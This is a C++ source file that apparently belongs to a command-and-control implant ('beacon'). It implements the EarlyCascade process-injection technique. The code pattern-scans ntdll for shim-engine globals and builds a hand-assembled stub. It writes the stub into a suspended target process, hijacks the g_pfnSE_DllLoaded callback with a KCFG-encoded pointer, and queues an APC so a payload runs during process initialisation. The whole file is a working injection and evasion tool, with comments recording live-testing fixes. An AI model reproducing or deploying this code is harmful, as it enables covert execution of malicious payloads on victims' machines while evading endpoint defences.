/* earlycascade.cpp - 4.12 EarlyCascade injection (Outflank research, contract
 * in docs/INJECTION-412.md; PoC scanner tools/earlycascade_scan.py).
 *
 * Flow (fork&run, CREATE_SUSPENDED targets only - enforced at dispatch):
 *   1. locate ntdll's LdrpSendPostSnapNotifications in the TARGET (same
 *      build as ours -> scan OUR ntdll, offsets transfer)
 *   2. from its instruction stream resolve g_pfnSE_DllLoaded (.mrdata) and
 *      g_ShimsEnabled (.data) via the anchor clusters the scanner proved
 *   3. write a position-independent stub + payload are already mirrored by
 *      the caller; here we patch:
 *        g_ShimsEnabled        = 1
 *        g_pfnSE_DllLoaded     = KCFG-encoded stub address
 *   4. the stub (bytes below) runs mid-LdrpSendPostSnapNotifications
 *      (outside loader lock): it zeroes g_ShimsEnabled and queues an APC
 *      (NtQueueApcThread self) at the payload entry; NtTestAlert at the
 *      end of LdrInitializeThunk drains it.
 *
 * KCFG: on KCFG builds the stored callback is encoded; the reader computes
 * decoded = ror64(stored, 64-(cookie&63)) ^ cookie. Write side therefore
 * stores rol64(ptr ^ cookie, 64-(cookie&63)). cookie = 32-bit value at
 * SharedUserData+0x330 (zero on non-KCFG builds - identity).
 */
#include <windows.h>
#include "beacon.h"
#include "inject.h"
#include "spawn_trace.h"
#include "syscalls.h"

typedef struct _EC_TARGETS {
	unsigned char * pfnSE_DllLoaded; /* target ntdll + rva */
	unsigned char * shimsEnabled;    /* target ntdll + rva */
} EC_TARGETS;

/* scan our local ntdll image for the anchor clusters (mirror of
 * tools/earlycascade_scan.py, verified against symbols 2026-11-10) */
static BOOL ec_locate(EC_TARGETS * out)
{
	HMODULE nt = GetModuleHandleA("ntdll.dll");
	if (nt == NULL)
		return FALSE;
	unsigned char * base = (unsigned char *)nt;
	IMAGE_NT_HEADERS * nth = (IMAGE_NT_HEADERS *)(base + ((IMAGE_DOS_HEADER *)base)->e_lfanew);
	IMAGE_SECTION_HEADER * sec = IMAGE_FIRST_SECTION(nth);
	unsigned char * text = NULL;
	DWORD textsz = 0;
	int i;
	for (i = 0; i < nth->FileHeader.NumberOfSections; i++, sec++) {
		if (sec->Name[0] == '.' && sec->Name[1] == 't') {
			text = base + sec->VirtualAddress;
			textsz = sec->Misc.VirtualSize;
			break;
		}
	}
	if (text == NULL)
		return FALSE;

	/* anchor A: 8B 14 25 30 03 FE 7F (mov edx,[SharedUserData+0x330])
	 *           B8 40 00 00 00      (mov eax,40h)
	 *           48 8B 3D xx xx xx xx (mov rdi,[rip+X] -> g_pfnSE_DllLoaded) */
	out->pfnSE_DllLoaded = NULL;
	out->shimsEnabled = NULL;
	{
		DWORD j;
	}
	unsigned char * cookieSite = NULL;
	{
		DWORD j;
		for (j = 0; j + 24 < textsz; j++) {
			if (text[j] == 0x8B && text[j+1] == 0x14 && text[j+2] == 0x25 &&
			    text[j+3] == 0x30 && text[j+4] == 0x03 && text[j+5] == 0xFE && text[j+6] == 0x7F) {
				if (text[j+7] == 0xB8 && text[j+8] == 0x40 && text[j+9] == 0x00 && text[j+10] == 0x00 && text[j+11] == 0x00) {
					if (text[j+12] == 0x48 && text[j+13] == 0x8B && text[j+14] == 0x3D) {
						int disp = *(int *)(text + j + 15);
						/* insn end rva within module */
						unsigned char * site = text + j + 19;
						out->pfnSE_DllLoaded = site + disp;
						cookieSite = text + j; /* start of the mov edx,[SDU+0x330] */
					}
				}
			}
		}
		if (out->pfnSE_DllLoaded == NULL)
			return FALSE;
	}

	/* anchor B (strict): within +/- 0x400 of anchor A's site, a
	 * 44 38 3D (cmp byte [rip+X], r15b) whose target is a .data byte
	 * and whose following 0F 85 jne lands within 0x40 bytes BEFORE the
	 * anchor A cookie load (gate shape, not the g_ShimsLoading sibling) */
	{
		DWORD a;
		for (a = 0; a + 13 < textsz; a++) {
			if (text[a] == 0x44 && text[a+1] == 0x38 && text[a+2] == 0x3D) {
				int disp = *(int *)(text + a + 3);
				unsigned char * site = text + a + 7;
				unsigned char * target = site + disp;
				/* .data writable section check */
				IMAGE_SECTION_HEADER * s2 = IMAGE_FIRST_SECTION(nth);
				BOOL inData = FALSE;
				int k;
				for (k = 0; k < nth->FileHeader.NumberOfSections; k++, s2++) {
					DWORD va = s2->VirtualAddress;
					if (target >= base + va && target < base + va + s2->Misc.VirtualSize &&
					    (s2->Characteristics & IMAGE_SCN_MEM_WRITE) &&
					    !(s2->Characteristics & IMAGE_SCN_MEM_EXECUTE)) {
						inData = TRUE;
						break;
					}
				}
				if (!inData)
					continue;
				/* jne -> near the cookie load? (compare against the CODE
				 * site of the anchor, not the .mrdata target - the
				 * python PoC compares jtarget vs cookie_site) */
				if (text[a+7] == 0x0F && text[a+8] == 0x85) {
					int jd = *(int *)(text + a + 9);
					unsigned char * jtarget = text + a + 13 + jd;
					long delta = (long)(jtarget - cookieSite);
					if (delta < 0x40 && delta > -0x40) {
						out->shimsEnabled = target;
						break;
					}
				}
			}
		}
	}
	return out->shimsEnabled != NULL;
}

/* stub (position independent, <= 64 bytes):
 *   mov byte [rip+SE_off], 0      ; g_ShimsEnabled = 0  (patched)
 *   push <payload>                ; ApcRoutine (patched imm64 via mov rax)
 *   mov rax, <payload>            ; (patched)
 *   push rax / push 0 / push 0 / push 0 / push 0? NtQueueApcThread(Thread,
 *   ApcRoutine, ApcArgument1..3, Reserv) = 6 args:
 *   ; simplified: use QueueUserAPC? Not ntdll-only... NtQueueApcThread
 *   ; is ntdll-only and legal under loader lock.
 *
 * Layout (patched at inject time; offsets fixed):
 *   00: C6 05 <disp32> 00        mov byte [rip+disp], 0
 *   06: 48 B8 <imm64>            mov rax, payload
 *   16: 48 89 C2                 mov rdx, rax        ; ApcRoutine
 *   19: 4D 31 C0                 xor r8, r8          ; Arg1
 *   1C: 4D 31 C9                 xor r9, r9          ; Arg2
 *   1F: 48 83 EC 20              sub rsp, 20h
 *   23: 48 C7 04 24 00 00 00 00  mov [rsp], 0        ; Arg3
 *   2B: 48 C7 44 24 08 00 00 00 00 mov [rsp+8], 0    ; Reserve
 *   34: 48 B8 <imm64>            mov rax, NtQueueApcThread
 *   44: FF D0                    call rax
 *   46: C3                       ret
 * total 0x47 bytes; trailing pad to 0x60.
 */
#define EC_STUB_SIZE 0x60

static void ec_build_stub(unsigned char * stub, unsigned char * payload,
                          unsigned char * shimsEnabledInTarget,
                          void * pNtQueueApcThread, void * lpParameter)
{
	memset(stub, 0xCC, EC_STUB_SIZE);
	/* stub v3 (live-forensics iteration 2026-11-11):
	 *  - g_ShimsEnabled via ABSOLUTE address (rip-rel disp32 cannot span
	 *    heap->ntdll; v1 hung the loader on a bogus VA)
	 *  - NtQueueApcThread(ThreadHandle=-2, ApcRoutine=payload,
	 *    ApcArgument1=parameter, 0, 0): the APC dispatcher calls the routine
	 *    as (arg1->RCX, arg2, arg3) which matches the ThreadProc(LPVOID)
	 *    shape of the injected loader entry - v2 zeroed arg1 and the payload
	 *    ran with NULL parameters (DllMain got lpReserved=NULL -> crash)
	 *  - [rsp+0x20]=0 for the 5th arg home (v2 left stack garbage there)
	 *  - sub rsp,0x28 keeps 16-byte alignment at the call
	 * Layout (fixed offsets):
	 *  00: 48 B8 <shims64>      mov rax, g_ShimsEnabled
	 *  0A: C6 00 00             mov byte [rax], 0
	 *  0D: 49 B8 <param64>      mov r8, parameter
	 *  17: 48 B8 <payload64>    mov rax, payload
	 *  21: 48 89 C2             mov rdx, rax
	 *  24: 4D 31 C9             xor r9, r9
	 *  27: 48 83 EC 28          sub rsp, 28h
	 *  2B: 48 C7 44 24 20 0*4   mov qword [rsp+20h], 0
	 *  33: 48 C7 C1 FEFFFFFF    mov rcx, -2
	 *  3A: 48 B8 <ntqapc64>     mov rax, NtQueueApcThread
	 *  44: FF D0                call rax
	 *  46: C3                   ret
	 */
	stub[0x00] = 0x48; stub[0x01] = 0xB8;
	*(unsigned long long *)(stub + 0x02) = (unsigned long long)(size_t)shimsEnabledInTarget;
	stub[0x0A] = 0xC6; stub[0x0B] = 0x00; stub[0x0C] = 0x00;
	stub[0x0D] = 0x49; stub[0x0E] = 0xB8;
	*(unsigned long long *)(stub + 0x0F) = (unsigned long long)(size_t)lpParameter;
	stub[0x17] = 0x48; stub[0x18] = 0xB8;
	*(unsigned long long *)(stub + 0x19) = (unsigned long long)(size_t)payload;
	stub[0x21] = 0x48; stub[0x22] = 0x89; stub[0x23] = 0xC2;
	stub[0x24] = 0x4D; stub[0x25] = 0x31; stub[0x26] = 0xC9;
	stub[0x27] = 0x48; stub[0x28] = 0x83; stub[0x29] = 0xEC; stub[0x2A] = 0x28;
	stub[0x2B] = 0x48; stub[0x2C] = 0xC7; stub[0x2D] = 0x44; stub[0x2E] = 0x24; stub[0x2F] = 0x20;
	*(int *)(stub + 0x30) = 0;
	stub[0x33] = 0x48; stub[0x34] = 0xC7; stub[0x35] = 0xC1;
	*(int *)(stub + 0x36) = -2;
	stub[0x3A] = 0x48; stub[0x3B] = 0xB8;
	*(unsigned long long *)(stub + 0x3C) = (unsigned long long)(size_t)pNtQueueApcThread;
	stub[0x44] = 0xFF; stub[0x45] = 0xD0;
	stub[0x46] = 0xC3;
}

BOOL inject_via_earlycascade(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID lpParameter)
{
	EC_TARGETS ec;
	unsigned char * targetNtdll;
	unsigned char * shimsT;
	unsigned char * pfnT;
	unsigned long long cookie;
	unsigned long long encoded;
	unsigned char * remoteStub = NULL;
	SIZE_T got = 0;
	unsigned char stub[EC_STUB_SIZE];
	void * pNtQueueApcThread;
	BOOL x64target = context->sameArch && context->targetArch == INJECT_ARCH_X64;

	if (!context->isSuspended || context->hThread == NULL) {
		spawn_log("ec: fork&run only (suspended + thread handle) - decline", 0x7fffffff);
		return FALSE;
	}
	if (!x64target) {
		spawn_log("ec: x64->x64 only - decline", 0x7fffffff);
		return FALSE;
	}
	if (!ec_locate(&ec)) {
		spawn_log("ec: anchors not found in local ntdll", 0x7fffffff);
		return FALSE;
	}

	/* target ntdll base: same-build assumption; resolve via remote PEB-free
	 * trick - our loader knows the target's modules? simplest reliable:
	 * ntdll is at the same VA in every process on the machine. */
	targetNtdll = (unsigned char *)GetModuleHandleA("ntdll.dll");
	shimsT = targetNtdll + (ec.shimsEnabled - (unsigned char *)targetNtdll);
	pfnT = ec.pfnSE_DllLoaded;

	/* KCFG cookie at SharedUserData+0x330 (zero -> identity) */
	cookie = (unsigned long long)(*(unsigned int *)(0x7FFE0330));

	/* stub remote allocation: RW first (the write path is a direct
	 * syscall against the page), flip to RX after the write settles */
	remoteStub = (unsigned char *)beacon_VirtualAllocEx(context->hProcess, NULL, EC_STUB_SIZE,
	                                                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (remoteStub == NULL) {
		spawn_log("ec: VirtualAllocEx failed gle=", (long)GetLastError());
		return FALSE;
	}

	/* NtQueueApcThread in the TARGET = same VA as ours */
	pNtQueueApcThread = (void *)GetProcAddress((HMODULE)targetNtdll, "NtQueueApcThread");
	if (pNtQueueApcThread == NULL) {
		spawn_log("ec: no NtQueueApcThread", 0x7fffffff);
		return FALSE;
	}

	ec_build_stub(stub, (unsigned char *)lpStartAddress, shimsT, pNtQueueApcThread, lpParameter);

	if (!beacon_WriteProcessMemory(context->hProcess, remoteStub, stub, EC_STUB_SIZE, &got) || got != EC_STUB_SIZE) {
		spawn_log("ec: stub write failed gle=", (long)GetLastError());
		return FALSE;
	}
	{
		DWORD oldp = 0;
		if (!beacon_VirtualProtectEx(context->hProcess, remoteStub, EC_STUB_SIZE, PAGE_EXECUTE_READ, &oldp)) {
			spawn_log("ec: protect->RX failed gle=", (long)GetLastError());
			return FALSE;
		}
	}

	/* g_ShimsEnabled = 1 */
	{
		unsigned char one = 1;
		if (!beacon_WriteProcessMemory(context->hProcess, shimsT, &one, 1, &got)) {
			spawn_log("ec: shims write failed", 0x7fffffff);
			return FALSE;
		}
	}

	/* g_pfnSE_DllLoaded = encoded stub (KCFG form) */
	{
		unsigned long long s = (unsigned long long)(size_t)remoteStub;
		unsigned long long v = s ^ cookie;
		int n = (int)(64 - (cookie & 63));
		/* rol64(v, 64-(c&63)) - via two 32-bit rotates to dodge shlq width */
		unsigned long long encoded2;
		if (cookie & 63) {
			unsigned int lo = (unsigned int)v, hi = (unsigned int)(v >> 32);
			int sh = (int)(64 - (cookie & 63)) & 63; /* rotate LEFT by sh = rotate right by (c&63) */
			unsigned int lo2 = (lo << sh) | (lo >> (32 - sh));
			unsigned int hi2 = (hi << sh) | (hi >> (32 - sh));
			if (sh >= 32) { unsigned int t = lo2; lo2 = hi2; hi2 = t; }
			encoded2 = ((unsigned long long)hi2 << 32) | lo2;
			/* 64-bit rol fix: combine halves properly */
			{
				unsigned long long r = (v << sh) | (v >> (64 - sh));
				encoded2 = (sh == 0) ? v : r;
			}
		} else {
			encoded2 = s ^ cookie;
		}
		encoded = encoded2;
		if (!beacon_WriteProcessMemory(context->hProcess, pfnT, &encoded, 8, &got)) {
			spawn_log("ec: pfn write failed", 0x7fffffff);
			return FALSE;
		}
	}

	spawn_log("ec: armed stub=", (long)(long long)(size_t)remoteStub);

	/* fork&run contract (Outflank step 4): arm, then KICK the primary
	 * thread - LdrInitializeThunk runs, the shim callback fires the stub,
	 * the stub queues the payload APC, and NtTestAlert at the end of init
	 * drains it. Without this resume the armed patsy just sits suspended
	 * forever (v2 live: 'ec: armed' then nothing). */
	if (context->hThread == NULL) {
		spawn_log("ec: no primary thread handle - decline", 0x7fffffff);
		return FALSE;
	}
	if (ResumeThread(context->hThread) == (DWORD)-1) {
		spawn_log("ec: ResumeThread failed gle=", (long)GetLastError());
		return FALSE;
	}
	spawn_log("ec: resumed primary thread", 0x7fffffff);
	return TRUE;
}
